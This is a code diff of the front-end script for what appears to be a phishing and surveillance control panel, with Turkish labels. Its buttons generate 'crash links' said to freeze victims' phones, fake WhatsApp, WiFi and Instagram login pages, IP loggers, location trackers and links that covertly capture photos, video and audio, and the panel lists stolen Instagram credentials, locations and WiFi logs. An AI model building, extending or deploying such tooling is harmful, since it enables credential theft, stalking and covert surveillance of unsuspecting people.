-        document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 💀 CRASH LINK: <a href="${crashUrl}" target="_blank" style="color:#ff0000;font-weight:bold;">${crashUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${crashUrl}')">${t('copy')}</button><br><small style="color:#ff0000;">Telefonu dondura (RAM/CPU overload)</small>`;
-    }
-	document.getElementById('instaLogsBtn').onclick = () => {
-    if (!currentUser) return;
-    const logsUrl = `${window.location.origin}/hack/instagram_logs_viewer.html?uid=${currentUser.uid}`;
-    document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 📸 INSTAGRAM LOGS PANELI: <a href="${logsUrl}" target="_blank" style="color:#00ff41">${logsUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${logsUrl}')">${t('copy')}</button><br><small style="color:#00ff41;">Kendi linkine gelen kullanıcıların Instagram giriş bilgilerini gösterir</small>`;
-};
+    document.getElementById('btnIpLogger').onclick = () => genHack('ip');
+    document.getElementById('btnWaFake').onclick = () => genHack('wa');
+    document.getElementById('btnWifiFake').onclick = () => genHack('wifi');
+    document.getElementById('btnIgFake').onclick = () => genHack('ig');
+    document.getElementById('btnLocation').onclick = () => genHack('loc');
+    document.getElementById('btnCrash').onclick = () => genHack('crash');
+
+    document.getElementById('btnRefreshLoc').onclick = loadLocations;
+    document.getElementById('btnClearLoc').onclick = () => clearColl('locations', 'userId', user?.uid, t('cClearLoc'), loadLocations);
+    document.getElementById('btnRefreshWifi').onclick = loadWifi;
+    document.getElementById('btnClearWifi').onclick = () => clearColl('wifi_logs', 'ownerId', user?.uid, t('cClearWifi'), loadWifi);
+    document.getElementById('btnRefreshAcc').onclick = loadAccounts;
+    document.getElementById('btnClearAcc').onclick = () => clearColl('ig_accounts', 'ownerId', user?.uid, t('cClearAcc'), loadAccounts);
     
-    function showStatsInfo() {
-        alert("📊 STATS\n\nBu panelde çekimleriniz listelenir.");
-    }
-	
-    
-    document.getElementById('genPhotoBtn').onclick = () => generateLink('photo', false);
-    document.getElementById('gen5PhotoBtn').onclick = () => generateLink('5photos', false);
-    document.getElementById('genVideoOnlyBtn').onclick = () => generateLink('videoonly', false);
-    document.getElementById('genAudioBtn').onclick = () => generateLink('audio', false);
-    document.getElementById('genVideoAudioBtn').onclick = () => generateLink('videoaudio', false);
-    
-    document.getElementById('igPhotoBtn').onclick = () => generateLink('photo', true);
-    document.getElementById('ig5PhotoBtn').onclick = () => generateLink('5photos', true);
-    document.getElementById('igVideoOnlyBtn').onclick = () => generateLink('videoonly', true);
-    document.getElementById('igAudioBtn').onclick = () => generateLink('audio', true);
-    document.getElementById('igVideoAudioBtn').onclick = () => generateLink('videoaudio', true);
-    
-    document.getElementById('ipLoggerBtn').onclick = generateIPLogger;
-    document.getElementById('fakeWABtn').onclick = generateFakeWA;
-    document.getElementById('crashBtn').onclick = generateCrash;
-    
-    document.getElementById('refreshBtn').onclick = loadMyData;
-    document.getElementById('clearAllBtn').onclick = clearAll;
-    document.getElementById('statsInfoBtn').onclick = showStatsInfo;
-    document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); window.location.href = 'login.html'; };
-    document.getElementById('langBtn').onclick = () => { currentLang = currentLang === 'en' ? 'ar' : 'en'; localStorage.setItem('app_language', currentLang); applyLanguage(); loadMyData(); };
-    
-    const modal = document.getElementById('modal');
-    modal.onclick = (e) => { if (e.target === modal || e.target.classList.contains('modal-close')) { modal.style.display = 'none'; document.getElementById('modalContent').innerHTML = ''; } };
-    
-    onAuthStateChanged(auth, (user) => {
-        if (user) { currentUser = user; applyLanguage(); loadMyData(); }
-        else window.location.href = 'login.html';
+    document.getElementById('btnRefreshAll').onclick = () => { loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); };
+    document.getElementById('btnClearAll').onclick = () => clearColl('captures', 'userId', user?.uid, t('cClearAll'), loadCaptures);
+    document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); location.href = 'login.html'; };
+
+    onAuthStateChanged(auth, (u) => {
+        if (u) { user = u; applyLang(); loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); }
+        else location.href = 'login.html';
     });
 </script>
 </body>
